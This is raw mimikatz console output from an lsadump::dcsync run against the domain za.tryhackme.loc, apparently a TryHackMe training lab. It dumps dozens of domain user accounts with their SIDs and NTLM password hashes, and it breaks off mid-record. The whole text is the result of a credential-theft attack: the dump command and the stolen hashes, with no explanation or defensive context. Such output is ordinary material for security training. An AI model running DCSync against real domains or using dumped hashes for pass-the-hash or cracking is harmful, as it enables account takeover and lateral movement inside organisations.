Using 'lorraine.gill_dcdump.txt' for logfile : OK

mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server
[DC] Exporting domain 'za.tryhackme.loc'
[rpc] Service  : ldap
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3860
Object Relative ID   : 3860

Credentials:
  Hash NTLM: 12cd448b64f07f6396205c1a4e3d2d58

Object RDN           : jenna.bishop

** SAM ACCOUNT **

SAM Username         : jenna.bishop
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3861
Object Relative ID   : 3861

Credentials:
  Hash NTLM: d49d89f4be04f51527b064597411b616

Object RDN           : heather.james

** SAM ACCOUNT **

SAM Username         : heather.james
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3862
Object Relative ID   : 3862

Credentials:
  Hash NTLM: 2e25f2bcea3b4148900435ebc99ed8a3

Object RDN           : sarah.walker

** SAM ACCOUNT **

SAM Username         : sarah.walker
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3863
Object Relative ID   : 3863

Credentials:
  Hash NTLM: 0f9c2d591ceb9ba172bd06ad6b5682a5

Object RDN           : sarah.pearce

** SAM ACCOUNT **

SAM Username         : sarah.pearce
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3864
Object Relative ID   : 3864

Credentials:
  Hash NTLM: 6d70711d87c9933482503ed116a036f4

Object RDN           : steven.noble

** SAM ACCOUNT **

SAM Username         : steven.noble
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3865
Object Relative ID   : 3865

Credentials:
  Hash NTLM: 137918d59e6162b6e90a5b45a3cb9784

Object RDN           : holly.griffiths

** SAM ACCOUNT **

SAM Username         : holly.griffiths
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3866
Object Relative ID   : 3866

Credentials:
  Hash NTLM: 9911a6801c5a802b73806ec0a6c52cb3

Object RDN           : sheila.foster

** SAM ACCOUNT **

SAM Username         : sheila.foster
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3867
Object Relative ID   : 3867

Credentials:
  Hash NTLM: 03b0d62bb49c9530035cf63d69d1f58d

Object RDN           : sylvia.jones

** SAM ACCOUNT **

SAM Username         : sylvia.jones
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3868
Object Relative ID   : 3868

Credentials:
  Hash NTLM: 54a6fed73b3e5cc3554ac5de213b5a28

Object RDN           : james.davis

** SAM ACCOUNT **

SAM Username         : james.davis
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3869
Object Relative ID   : 3869

Credentials:
  Hash NTLM: 9122e7bdfc78c9ab31b560d50bbebee8

Object RDN           : jemma.jones

** SAM ACCOUNT **

SAM Username         : jemma.jones
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3870
Object Relative ID   : 3870

Credentials:
  Hash NTLM: ac55328b1db2b09aaef1a6ffc6bec7f8

Object RDN           : marilyn.singh

** SAM ACCOUNT **

SAM Username         : marilyn.singh
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3871
Object Relative ID   : 3871

Credentials:
  Hash NTLM: d2708da1a44b3f45a7de0062202d363c

Object RDN           : stacey.lucas

** SAM ACCOUNT **

SAM Username         : stacey.lucas
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3872
Object Relative ID   : 3872

Credentials:
  Hash NTLM: c37a1a0b552491fb255873880fe148a7

Object RDN           : kim.johnson

** SAM ACCOUNT **

SAM Username         : kim.johnson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3873
Object Relative ID   : 3873

Credentials:
  Hash NTLM: eaadbbaf84f52f535120ba9dc1d80c2f

Object RDN           : tony.dale

** SAM ACCOUNT **

SAM Username         : tony.dale
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3874
Object Relative ID   : 3874

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc

Object RDN           : mary.smith

** SAM ACCOUNT **

SAM Username         : mary.smith
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3875
Object Relative ID   : 3875

Credentials:
  Hash NTLM: ebe3387ccf775a433ef0c49b22b42631

Object RDN           : toby.richardson

** SAM ACCOUNT **

SAM Username         : toby.richardson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3876
Object Relative ID   : 3876

Credentials:
  Hash NTLM: 316c5ae8a7b5dfce4a5604d17d9e976e

Object RDN           : craig.berry

** SAM ACCOUNT **

SAM Username         : craig.berry
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3877
Object Relative ID   : 3877

Credentials:
  Hash NTLM: 8091fee1f3890584904bd7d5cea1240e

Object RDN           : karen.miles

** SAM ACCOUNT **

SAM Username         : karen.miles
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3878
Object Relative ID   : 3878

Credentials:
  Hash NTLM: 21eea1de59dff4dc0fba994f84e279ed

Object RDN           : alice.curtis

** SAM ACCOUNT **

SAM Username         : alice.curtis
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3879
Object Relative ID   : 3879

Credentials:
  Hash NTLM: dfd0fc30240bfb89160fcf283696dd6e

Object RDN           : leslie.murphy

** SAM ACCOUNT **

SAM Username         : leslie.murphy
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3880
Object Relative ID   : 3880

Credentials:
  Hash NTLM: 90aaef7914e923045c4cd3b12f2aad4a

Object RDN           : dominic.macdonald

** SAM ACCOUNT **

SAM Username         : dominic.macdonald
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3881
Object Relative ID   : 3881

Credentials:
  Hash NTLM: de77b42b4a56251c63fe4f0f97a3bd3e

Object RDN           : joshua.blackburn

** SAM ACCOUNT **

SAM Username         : joshua.blackburn
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3882
Object Relative ID   : 3882

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc

Object RDN           : norman.thompson

** SAM ACCOUNT **

SAM Username         : norman.thompson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3883
Object Relative ID   : 3883

Credentials:
  Hash NTLM: fe0f7d8e93b2f555db3f948885499a9c

Object RDN           : abbie.hill

** SAM ACCOUNT **

SAM Username         : abbie.hill
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3884
Object Relative ID   : 3884

Credentials:
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Object RDN           : gareth.robinson

** SAM ACCOUNT **

SAM Username         : gareth.robinson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3885
Object Relative ID   : 3885

Credentials:
  Hash NTLM: 64f12cddaa88057e06a81b54e73b949b

Object RDN           : jeremy.clark

** SAM ACCOUNT **

SAM Username         : jeremy.clark
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3886
Object Relative ID   : 3886

Credentials:
  Hash NTLM: 451a92fddb130a7a94fbd67f4b52b92c

Object RDN           : roy.moore

** SAM ACCOUNT **

SAM Username         : roy.moore
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3887
Object Relative ID   : 3887

Credentials:
  Hash NTLM: 9d4d3dd8ec6e0b62fe6fc467ac9f03f2

Object RDN           : louis.perry

** SAM ACCOUNT **

SAM Username         : louis.perry
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3888
Object Relative ID   : 3888

Credentials:
  Hash NTLM: 0097dffa007f062f992003f16aa3fd37

Object RDN           : chelsea.hughes

** SAM ACCOUNT **

SAM Username         : chelsea.hughes
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3889
Object Relative ID   : 3889

Credentials:
  Hash NTLM: bdfdf1fd7c085e9ffc1aac26fb344f15

Object RDN           : stephanie.warren

** SAM ACCOUNT **

SAM Username         : stephanie.warren
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3890
Object Relative ID   : 3890

Credentials:
  Hash NTLM: 8597cdf919ec3fe00843cb54cd72ce20

Object RDN           : leanne.hussain

** SAM ACCOUNT **

SAM Username         : leanne.hussain
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3891
Object Relative ID   : 3891

Credentials:
  Hash NTLM: 6bd35fa2bc2f46c8a1a3009dcdab0866

Object RDN           : ruth.powell

** SAM ACCOUNT **

SAM Username         : ruth.powell
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3892
Object Relative ID   : 3892

Credentials:
  Hash NTLM: 1ec4d218f51b785eb4a0ef826ce0c788

Object RDN           : louis.morgan

** SAM ACCOUNT **

SAM Username         : louis.morgan
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3893
Object Relative ID   : 3893

Credentials:
  Hash NTLM: ca8661c35523ed1b6e6ffef43c4e75b5

Object RDN           : kevin.walton

** SAM ACCOUNT **

SAM Username         : kevin.walton
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3894
Object Relative ID   : 3894

Credentials:
  Hash NTLM: 58a478135a93ac3bf058a5ea0e8fdb71

Object RDN           : carly.robertson

** SAM ACCOUNT **

SAM Username         : carly.robertson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3895
Object Relative ID   : 3895

Credentials:
  Hash NTLM: 13e34cfff5cc2231f5220b85dd74be3c

Object RDN           : kenneth.booth

** SAM ACCOUNT **

SAM Username         : kenneth.booth
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3896
Object Relative ID   : 3896

Credentials:
  Hash NTLM: e0528ca2a6dbd1a41da078ed28a64646

Object RDN           : jessica.freeman

** SAM ACCOUNT **

SAM Username         : jessica.freeman
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3897
Object Relative ID   : 3897

Credentials:
  Hash NTLM: dcaa1c6962c01bdfec3e6d36cf04696a

Object RDN           : julian.cooper

** SAM ACCOUNT **

SAM Username         : julian.cooper
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3898
Object Relative ID   : 3898

Credentials:
  Hash NTLM: e7e05abde4185f4c71c751b8102fd666

Object RDN           : cheryl.martin

** SAM ACCOUNT **

SAM Username         : cheryl.martin
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3899
Object Relative ID   : 3899

Credentials:
  Hash NTLM: c9b16d8a62f0fbec60f7985e47804441

Object RDN           : donald.davies

** SAM ACCOUNT **

SAM Username         : donald.davies
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3900
Object Relative ID   : 3900

Credentials:
  Hash NTLM: e1c7bbf07b2dbede7c77f67c879db95e

Object RDN           : louise.brown1

** SAM ACCOUNT **

SAM Username         : louise.brown1
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3901
Object Relative ID   : 3901

Credentials:
  Hash NTLM: 0a835ff913f96193720ea94486eff47d

Object RDN           : louis.roberts

** SAM ACCOUNT **

SAM Username         : louis.roberts
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3902
Object Relative ID   : 3902

Credentials:
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Object RDN           : vincent.jones

** SAM ACCOUNT **

SAM Username         : vincent.jones
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3903
Object Relative ID   : 3903

Credentials:
  Hash NTLM: a88500ce6f778693d69bf95686c6708b

Object RDN           : harry.hargreaves

** SAM ACCOUNT **

SAM Username         : harry.hargreaves
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3904
Object Relative ID   : 3904

Credentials:
  Hash NTLM: 23e1d10001876b0078a9a779017fc026

Object RDN           : georgina.bradley

** SAM ACCOUNT **

SAM Username         : georgina.bradley
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3905
Object Relative ID   : 3905

Credentials:
  Hash NTLM: 9d38ec75537f73ca0c5bec425ab11623

Object RDN           : mitchell.jones

** SAM ACCOUNT **

SAM Username         : mitchell.jones
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3906
Object Relative ID   : 3906

Credentials:
  Hash NTLM: ae6470c1b8a3ce86ba874d760ebb9267

Object RDN           : zoe.wright

** SAM ACCOUNT **

SAM Username         : zoe.wright
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3907
Object Relative ID   : 3907

Credentials:
  Hash NTLM: 6fadcc8c00207f86703ef2273b6fc495

Object RDN           : ann.johnson

** SAM ACCOUNT **

SAM Username         : ann.johnson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3908
Object Relative ID   : 3908

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc

Object RDN           : jamie.lewis

** SAM ACCOUNT **

SAM Username         : jamie.lewis
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3909
Object Relative ID   : 3909

Credentials:
  Hash NTLM: 3608472ad6e65fc912f11a3547b27c79

Object RDN           : sylvia.brooks

** SAM ACCOUNT **

SAM Username         : sylvia.brooks
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3910
Object Relative ID   : 3910

Credentials:
  Hash NTLM: 807d3230ff74571e4bb81f3ce5fc7998

Object RDN           : nicholas.middleton

** SAM ACCOUNT **

SAM Username         : nicholas.middleton
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3911
Object Relative ID   : 3911

Credentials:
  Hash NTLM: 594c20a98110d5ecf6bba573df97726b

Object RDN           : katherine.palmer

** SAM ACCOUNT **

SAM Username         : katherine.palmer
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3912
Object Relative ID   : 3912

Credentials:
  Hash NTLM: 1321c4f7a19c073cd0e725cf3e60c8f5

Object RDN           : rachel.ellis

** SAM ACCOUNT **

SAM Username         : rachel.ellis
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3913
Object Relative ID   : 3913

Credentials:
  Hash NTLM: 3a6b2845c749a4869f65e4529ba6fad3

Object RDN           : gillian.baldwin

** SAM ACCOUNT **

SAM Username         : gillian.baldwin
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3914
Object Relative ID   : 3914

Credentials:
  Hash NTLM: 58a478135a93ac3bf058a5ea0e8fdb71

Object RDN           : carole.hayes

** SAM ACCOUNT **

SAM Username         : carole.hayes
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3915
Object Relative ID   : 3915

Credentials:
  Hash NTLM: fd8206736350a929cfa965453eee2b86

Object RDN           : katie.mclean

** SAM ACCOUNT **

SAM Username         : katie.mclean
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3916
Object Relative ID   : 3916

Credentials:
  Hash NTLM: 024caa2c88c2d731b3f646f180167e5b

Object RDN           : francis.cartwright

** SAM ACCOUNT **

SAM Username         : francis.cartwright
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3917
Object Relative ID   : 3917

Credentials:
  Hash NTLM: 9e185c7bc31c0651cc14d6397b51845f

Object RDN           : richard.payne

** SAM ACCOUNT **

SAM Username         : richard.payne
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3918
Object Relative ID   : 3918

Credentials:
  Hash NTLM: 61e8f8be47ff4bdccfed150b3944cc61

Object RDN           : lindsey.stone

** SAM ACCOUNT **

SAM Username         : lindsey.stone
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3919
Object Relative ID   : 3919

Credentials:
  Hash NTLM: 20a115c4bcaded8620172a54a239d767

Object RDN           : jill.dawson

** SAM ACCOUNT **

SAM Username         : jill.dawson
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-3920
